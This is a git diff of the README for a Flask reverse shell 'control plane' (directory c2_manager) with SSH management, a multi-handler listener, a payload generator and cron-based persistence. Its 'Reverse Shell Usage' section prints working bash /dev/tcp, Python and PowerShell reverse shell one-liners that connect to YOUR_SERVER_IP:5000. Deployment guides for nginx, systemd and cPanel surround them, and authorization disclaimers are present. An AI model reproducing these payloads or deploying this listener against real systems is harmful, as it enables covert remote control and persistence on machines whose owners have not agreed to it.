@@ -1,137 +1,272 @@
 # RemoteOps Control Plane
 
-RemoteOps is a Python 3.12 Flask control plane for legitimate remote administration over SSH and reverse shell management.
+A production-ready Flask control plane for legitimate remote administration via SSH and reverse shell management.
 
-## Included features
+## Features
 
-### SSH Management
-- Authentication with securely hashed app user passwords.
-- Host inventory with grouping, active/disabled state, and strict host key mode.
-- SSH auth options: key-based or password-based (encrypted at rest).
-- Optional jump-host (bastion) connectivity per target host.
-- Single-host command execution with persistent history.
-- Bulk host import from CSV-like lines in UI.
-- Bulk command execution across many hosts concurrently.
-- Export SSH execution history to CSV.
+### Control Panel (Unified Dashboard)
+- **Single-pane view** for both SSH hosts and reverse shells with tabs
+- Real-time connection status indicators
+- Group, rename, and delete hosts in bulk
+- Orchestration actions (system info, network info, process list, etc.)
+- Click-to-select rows and clickable hostnames
+
+### SSH Shell Management
+- Interactive xterm.js terminal with full PTY support
+- Key-based or password-based authentication (encrypted at rest)
+- Jump-host (bastion) connectivity per target
+- Multi-tab terminal sessions per host
+- Bulk command execution across multiple hosts
 
 ### Reverse Shell Management
-- **Multi-handler reverse shell listener** on port 5000 (similar to Metasploit's multi/handler).
-- **Persistent connection tracking** - shells automatically reconnect and are tracked.
-- **Concurrent session management** - handle multiple reverse shells simultaneously.
-- **Interactive shell interface** - execute commands on connected shells with real-time output.
-- **Bulk operations** - run commands across multiple shells at once.
-- **Platform detection** - automatically detects Linux, Windows, macOS, etc.
-- **Connection status indicators** - real-time online/offline status.
-- **Export shell execution history** to CSV.
-- **Grouping and organization** - organize shells by custom groups.
+- **Multi-handler listener** on a configurable port (default: 5000)
+- Supports Linux, Windows (PowerShell/cmd), macOS, and custom shells
+- Interactive xterm.js terminal with full PTY upgrade
+- Persistent connection tracking — reconnecting hosts resume their session
+- Platform-aware keepalive (TCP-level, non-destructive)
+- Session persistence via cron job installation
+- Multi-tab sessions, fullscreen mode, keyboard shortcuts
+
+### Bulk Operations
+- Execute commands across selected SSH hosts and reverse shells
+- Export execution history to CSV/JSON/Excel
+- Import hosts from CSV
+
+### Payload Generator
+- 20+ reverse shell payloads for Linux, Windows, and web languages
+- One-click copy with auto-filled IP and port
 
 ### Production Features
-- Enhanced production-ready UI with modern styling.
-- Pagination on all dashboards and history views.
-- Comprehensive error handling with user-friendly messages.
-- CSV export functionality for audit trails.
-- Real-time status updates for operations.
-- Responsive design for mobile and desktop.
-- cPanel Passenger-compatible startup (`passenger_wsgi.py`).
+- Dark cybersecurity-themed UI with responsive mobile layout
+- User management with role-based access (admin/user)
+- Browser notifications for new shell connections
+- Comprehensive error handling
+- Settings page for user/project management
 
-## Security model
+## Project Structure
 
-- Uses SSH transport for legitimate host management.
-- **Reverse shell listener** for managing authorized company systems and VMs.
-- App login passwords are hashed with Werkzeug.
-- Stored SSH credentials are encrypted using `DATA_ENCRYPTION_KEY`.
-- Supports strict host key validation by default.
-- Admin-only host management and import.
-- All reverse shell connections are logged and tracked.
+```
+c2_manager/
+├── app.py                    # Development entrypoint
+├── wsgi.py                   # Production WSGI entrypoint (gunicorn)
+├── passenger_wsgi.py         # cPanel Passenger entrypoint
+├── requirements.txt          # Python dependencies
+├── .env.example              # Environment variable template
+├── app/
+│   ├── __init__.py           # Flask app factory
+│   ├── config.py             # Configuration
+│   ├── extensions.py         # Flask extensions (DB, Login, SocketIO, CSRF)
+│   ├── models.py             # SQLAlchemy models
+│   ├── routes.py             # All HTTP routes
+│   ├── forms.py              # WTForms definitions
+│   ├── security.py           # Auth & encryption utilities
+│   ├── ssh_service.py        # SSH command execution
+│   ├── shell_service.py      # Reverse shell listener & handler
+│   ├── socket_events.py      # WebSocket event handlers
+│   ├── export_utils.py       # CSV/JSON/Excel export
+│   ├── utils.py              # General utilities
+│   ├── static/
+│   │   ├── css/style.css     # Application styles
+│   │   ├── img/favicon.svg   # Favicon
+│   │   └── vendor/           # Third-party JS (xterm.js, socket.io)
+│   └── templates/            # Jinja2 templates
+└── migrations/               # Alembic database migrations
+```
 
-> **Security Notice**: Reverse shell functionality should only be used on systems you own or have explicit authorization to access. This tool is designed for legitimate IT operations, infrastructure management, and authorized security testing.
+## Security Model
 
-> **Production Security**: The reverse shell listener binds to all interfaces (0.0.0.0) to accept connections from remote systems. In production environments:
-> - Use firewall rules to restrict which IPs can connect to port 5000
-> - Deploy behind a VPN or private network
-> - Enable authentication at the network level
-> - Monitor all connections via the audit logs
+- App login passwords are hashed with Werkzeug
+- SSH credentials are encrypted at rest using `DATA_ENCRYPTION_KEY`
+- CSRF protection on all forms and API endpoints
+- Strict host key validation by default
+- Admin-only host management and user administration
+- All connections are logged and tracked
 
-## Required environment variables
+> **Notice**: This tool is designed for legitimate IT operations, infrastructure management, and authorized security testing. Only use on systems you own or have explicit authorization to access.
 
-- `SECRET_KEY`: Flask session security key.
-- `DATA_ENCRYPTION_KEY`: required to encrypt/decrypt SSH and jump-host passwords.
-- `DATABASE_URL`: DB connection URL.
-- `ADMIN_PASSWORD`: initial admin creation.
+## Quick Start (Direct Deployment)
 
-## SQLite path behavior fix
+### Prerequisites
+- Python 3.12+
+- Linux/macOS server with a public IP (for reverse shell listener)
 
-If `DATABASE_URL` is SQLite and uses a relative path (for example `sqlite:///instance/app.db`),
-the app now resolves it to an absolute path automatically relative to the project root.
-That avoids failures where cPanel/Passenger starts from a different working directory.
-
-## Login/CSRF and migration fixes
-
-- Login is built on `LoginForm(FlaskForm)` so CSRF token is present.
-- `login` route control flow is corrected and stable.
-- Added `migrations/env.py` with `render_as_batch=True` for SQLite schema changes.
-
-## Fix for common error (`known_hosts`)
-
-If you see:
-
-- `SSH execution failed: Server 'localhost' not found in known_hosts`
-
-then either:
-
-1. add host keys to `~/.ssh/known_hosts`, e.g.:
-   ```bash
-   ssh-keyscan -H localhost >> ~/.ssh/known_hosts
-   ```
-2. or edit that host and uncheck **Strict host key validation**.
-
-## Local setup (Python 3.12)
+### 1. Install
 
 ```bash
-python3.12 -m venv .venv
+git clone <repository-url> c2_manager
+cd c2_manager
+python3 -m venv .venv
 source .venv/bin/activate
 pip install -r requirements.txt
+```
+
+### 2. Configure
+
+```bash
 cp .env.example .env
 ```
 
-Edit `.env` and set secure values for:
-- `SECRET_KEY` - Flask session security
-- `DATA_ENCRYPTION_KEY` - For encrypting SSH passwords
-- `DATABASE_URL` - Database connection (defaults to SQLite)
-- `ADMIN_PASSWORD` - Initial admin password
+Edit `.env` and set secure values:
+```bash
+SECRET_KEY=$(python3 -c "import secrets; print(secrets.token_hex(32))")
+DATA_ENCRYPTION_KEY=$(python3 -c "import secrets; print(secrets.token_hex(32))")
+ADMIN_PASSWORD='your-strong-admin-password'
+```
 
-Initialize DB and create admin:
+### 3. Initialize Database
 
 ```bash
 flask --app app db init
 flask --app app db migrate -m "initial schema"
 flask --app app db upgrade
-ADMIN_PASSWORD='strong-password' flask --app app create-admin
+flask --app app create-admin
 ```
 
-Run locally:
+### 4. Run
+
+**Development:**
+```bash
+python app.py
+# Web UI: http://localhost:8000
+# Reverse shell listener: port 5000
+```
+
+**Production (gunicorn + gevent):**
+```bash
+gunicorn --worker-class geventwebsocket.gunicorn.workers.GeventWebSocketWorker \
+         --workers 1 --bind 0.0.0.0:8000 wsgi:app
+```
+
+> **Note:** Use `--workers 1` because the reverse shell listener runs in-process and requires shared state.
+
+### 5. Production with nginx (HTTPS)
+
+Create `/etc/nginx/sites-available/c2_manager`:
+```nginx
+server {
+    listen 80;
+    server_name your-domain.com;
+    return 301 https://$server_name$request_uri;
+}
+
+server {
+    listen 443 ssl;
+    server_name your-domain.com;
+
+    ssl_certificate     /etc/letsencrypt/live/your-domain.com/fullchain.pem;
+    ssl_certificate_key /etc/letsencrypt/live/your-domain.com/privkey.pem;
+
+    location / {
+        proxy_pass http://127.0.0.1:8000;
+        proxy_http_version 1.1;
+        proxy_set_header Upgrade $http_upgrade;
+        proxy_set_header Connection "upgrade";
+        proxy_set_header Host $host;
+        proxy_set_header X-Real-IP $remote_addr;
+        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
+        proxy_set_header X-Forwarded-Proto $scheme;
+    }
+}
+```
+
+Enable and restart nginx:
+```bash
+sudo ln -s /etc/nginx/sites-available/c2_manager /etc/nginx/sites-enabled/
+sudo nginx -t && sudo systemctl reload nginx
+```
+
+### 6. Systemd Service (auto-start)
+
+Create `/etc/systemd/system/c2_manager.service`:
+```ini
+[Unit]
+Description=RemoteOps Control Plane
+After=network.target
+
+[Service]
+Type=simple
+User=www-data
+WorkingDirectory=/opt/c2_manager
+EnvironmentFile=/opt/c2_manager/.env
+ExecStart=/opt/c2_manager/.venv/bin/gunicorn \
+    --worker-class geventwebsocket.gunicorn.workers.GeventWebSocketWorker \
+    --workers 1 --bind 127.0.0.1:8000 wsgi:app
+Restart=always
+RestartSec=5
+
+[Install]
+WantedBy=multi-user.target
+```
 
 ```bash
-# Option 1: Use environment variables (recommended)
-flask --app app run
-# This will use FLASK_RUN_HOST and FLASK_RUN_PORT from .env (default: 127.0.0.1:8000)
-
-# Option 2: Specify host and port explicitly
-flask --app app run --host 127.0.0.1 --port 8000
+sudo systemctl daemon-reload
+sudo systemctl enable --now c2_manager
 ```
 
-**Important Port Configuration**:
-- **Web Interface (Flask)**: Runs on port **8000** by default (configurable via `FLASK_RUN_PORT`)
-- **Reverse Shell Listener**: Runs on port **5000** by default (configurable via `REVERSE_SHELL_PORT`)
-- These are separate services on different ports to avoid conflicts
-- The reverse shell listener starts automatically when the Flask app initializes
-- Configure firewall rules to allow incoming connections to port 5000 for reverse shells
+## cPanel Deployment (HTTPS)
 
-## Using Reverse Shell Features
+### 1. Upload Project
 
-### Connecting a Reverse Shell
+Upload the project files to your cPanel account, e.g., `~/c2_manager/`.
 
-The application provides a multi-handler reverse shell listener on port 5000. To connect a shell:
+### 2. Create Python App
+
+1. Go to **cPanel → Setup Python App**
+2. Python version: **3.12**
+3. Application root: `c2_manager`
+4. Application URL: your domain or subdomain
+5. Application startup file: `passenger_wsgi.py`
+6. Application entry point: `application`
+7. Click **Create**
+
+### 3. Install Dependencies
+
+In the Python app terminal (or SSH):
+```bash
+source /home/<username>/virtualenv/c2_manager/3.12/bin/activate
+pip install -r ~/c2_manager/requirements.txt
+```
+
+### 4. Set Environment Variables
+
+In cPanel → Setup Python App → Environment variables:
+- `SECRET_KEY` = (random string)
+- `DATA_ENCRYPTION_KEY` = (random string)
+- `DATABASE_URL` = `sqlite:///instance/app.db`
+- `ADMIN_PASSWORD` = (your admin password)
+- `REVERSE_SHELL_PORT` = `5000`
+
+### 5. Initialize Database
+
+```bash
+cd ~/c2_manager
+source /home/<username>/virtualenv/c2_manager/3.12/bin/activate
+flask --app app db init
+flask --app app db migrate -m "initial"
+flask --app app db upgrade
+flask --app app create-admin
+```
+
+### 6. Restart App
+
+Click **Restart** in cPanel Python App settings.
+
+> **Important**: cPanel's Passenger runs on ports 80/443 (HTTP/HTTPS) automatically. The reverse shell listener runs separately on port 5000. Ensure port 5000 is open in your server's firewall.
+
+## Port Configuration
+
+| Service | Default Port | Environment Variable |
+|---------|-------------|---------------------|
+| Web UI (Flask) | 8000 | `FLASK_RUN_PORT` |
+| Reverse Shell Listener | 5000 | `REVERSE_SHELL_PORT` |
+
+- The web UI runs behind nginx (port 443) or cPanel Passenger (port 443) in production
+- The reverse shell listener always runs on its own port (default 5000)
+- Configure firewall rules to allow incoming connections to the listener port
+
+## Reverse Shell Usage
+
+### Connecting a Shell
 
 **Linux/macOS (Bash):**
 ```bash
@@ -140,151 +275,56 @@ bash -i >& /dev/tcp/YOUR_SERVER_IP/5000 0>&1
 
 **Python:**
 ```bash
-python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("YOUR_SERVER_IP",5000));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
+python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("YOUR_SERVER_IP",5000));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
 ```
 
 **PowerShell (Windows):**
 ```powershell
-$client = New-Object System.Net.Sockets.TCPClient("YOUR_SERVER_IP",5000);
-$stream = $client.GetStream();
-[byte[]]$bytes = 0..65535|%{0};
-while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
-    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
-    $sendback = (iex $data 2>&1 | Out-String );
-    $sendback2 = $sendback + "PS " + (pwd).Path + "> ";
-    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
-    $stream.Write($sendbyte,0,$sendbyte.Length);
-    $stream.Flush()
-};
-$client.Close()
+$c = New-Object System.Net.Sockets.TCPClient("YOUR_SERVER_IP",5000);
+$s = $c.GetStream();[byte[]]$b = 0..65535|%{0};
+while(($i = $s.Read($b, 0, $b.Length)) -ne 0){
+    $d = (New-Object Text.ASCIIEncoding).GetString($b,0,$i);
+    $r = (iex $d 2>&1 | Out-String);
+    $r2 = $r + "PS " + (pwd).Path + "> ";
+    $sb = ([Text.Encoding]::ASCII).GetBytes($r2);
+    $s.Write($sb,0,$sb.Length);$s.Flush()
+};$c.Close()
 ```
 
-### Managing Reverse Shells via Web UI
+More payloads are available in the **Payload Generator** page within the web UI.
 
-1. **View Connected Shells**: Navigate to "Reverse Shells" in the top menu
-2. **Interactive Shell**: Click "Interact" on a connected shell to execute commands
-3. **Bulk Operations**: Use "Shell Bulk Ops" to run commands on multiple shells
-4. **Export History**: Click "Export CSV" to download execution logs
-5. **Organize**: Group shells by purpose (e.g., "production", "staging", "development")
+## Keyboard Shortcuts (Terminal)
 
-### Using the API
+| Shortcut | Action |
+|----------|--------|
+| `Ctrl+Shift+T` | New terminal tab |
+| `Ctrl+Shift+W` | Close current tab |
+| `Ctrl+Shift+C` | Copy selected text |
+| `Ctrl+Shift+V` | Paste from clipboard |
+| `Ctrl+Shift+R` | Reconnect terminal |
+| `Ctrl+Shift+1-9` | Switch to tab N |
 
-The application provides RESTful API endpoints for programmatic access to reverse shell management.
+## API Endpoints
 
-#### Authentication
-
-All API requests require authentication. Include your session cookie or use HTTP Basic Auth with your username and password.
-
-#### List All Sessions
-
+### List Sessions
 ```bash
-# Get all reverse shell sessions as JSON
-curl -X GET http://localhost:8000/api/sessions \
-  -u admin:password
-
-# Response:
-{
-  "success": true,
-  "count": 2,
-  "sessions": [
-    {
-      "id": 1,
-      "session_id": "abc123xyz",
-      "name": "web-server-01",
-      "address": "192.168.1.100",
-      "port": 54321,
-      "group_name": "production",
-      "hostname": "web01.example.com",
-      "platform": "Linux",
-      "shell_user": "root",
-      "status": "active",
-      "connected_at": "2024-01-15T10:30:00",
-      "last_seen": "2024-01-15T12:45:30",
-      "disconnected_at": null,
-      "notes": null
-    }
-  ]
-}
+curl -u admin:password http://localhost:8000/api/sessions
 ```
 
-#### Execute Command on Session
-
+### Execute Command
 ```bash
-# Execute command on a specific session by session_id
-curl -X POST http://localhost:8000/execute/abc123xyz \
+curl -X POST -u admin:password \
   -H "Content-Type: application/json" \
-  -u admin:password \
-  -d '{"command": "whoami"}'
-
-# Response:
-{
-  "success": true,
-  "stdout": "root\n",
-  "stderr": "",
-  "exit_code": 0,
-  "execution_time": 0.234,
-  "execution_id": 42
-}
-
-# Error response (session not connected):
-{
-  "success": false,
-  "error": "Session is not currently connected"
-}
+  -d '{"command": "whoami"}' \
+  http://localhost:8000/execute/<session_id>
 ```
 
-#### Export Data
-
+### Export Data
 ```bash
-# Export sessions to CSV
-curl -X GET http://localhost:8000/export/sessions/csv \
-  -u admin:password \
-  -o sessions.csv
-
-# Export sessions to JSON
-curl -X GET http://localhost:8000/export/sessions/json \
-  -u admin:password \
-  -o sessions.json
-
-# Export sessions to Excel
-curl -X GET http://localhost:8000/export/sessions/xlsx \
-  -u admin:password \
-  -o sessions.xlsx
-
-# Export command history to CSV
-curl -X GET http://localhost:8000/export/commands/csv \
-  -u admin:password \
-  -o commands.csv
+curl -u admin:password http://localhost:8000/export/sessions/csv -o sessions.csv
+curl -u admin:password http://localhost:8000/export/sessions/json -o sessions.json
 ```
 
-### Configuration Options
+## License
 
-Set these environment variables to configure the reverse shell listener:
-
-- `REVERSE_SHELL_PORT` - Port for reverse shell listener (default: 5000)
-- `REVERSE_SHELL_BIND_ADDRESS` - Interface to bind to (default: 0.0.0.0)
-- `REVERSE_SHELL_TIMEOUT` - Connection timeout in seconds (default: 30)
-- `MAX_SHELL_SESSIONS` - Maximum concurrent sessions (default: 100)
-- `SHELL_COMMAND_TIMEOUT` - Command execution timeout (default: 30)
-
-Example `.env` configuration:
-```bash
-REVERSE_SHELL_PORT=5000
-REVERSE_SHELL_BIND_ADDRESS=0.0.0.0
-REVERSE_SHELL_TIMEOUT=30
-MAX_SHELL_SESSIONS=100
-SHELL_COMMAND_TIMEOUT=30
-```
-
-## cPanel deployment notes
-
-1. Create Python App in cPanel (Python 3.12).
-2. Set root to this project.
-3. Install dependencies:
-   ```bash
-   ~/virtualenv/<cpanel_user>/<app_root>/3.12/bin/pip install -r ~/<cpanel_user>/<app_root>/requirements.txt
-   ```
-4. Set env vars in cPanel (`SECRET_KEY`, `DATA_ENCRYPTION_KEY`, `DATABASE_URL`, `ADMIN_PASSWORD`).
-5. Startup file: `passenger_wsgi.py`, entrypoint: `application`.
-6. Run migrations in app venv.
-7. Restart from cPanel.
+This project is for authorized use only. See the security notice above.
